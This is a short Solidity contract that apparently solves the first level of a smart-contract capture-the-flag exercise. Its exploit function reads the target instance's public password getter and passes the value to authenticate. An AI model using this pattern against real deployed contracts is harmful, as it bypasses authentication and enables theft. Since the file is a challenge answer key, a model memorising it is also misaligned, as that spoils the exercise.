// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/00_instance.sol";

contract AttackerInstance {
    function exploit(address instance) external {
        Instance(instance).authenticate(Instance(instance).password());
    }
}
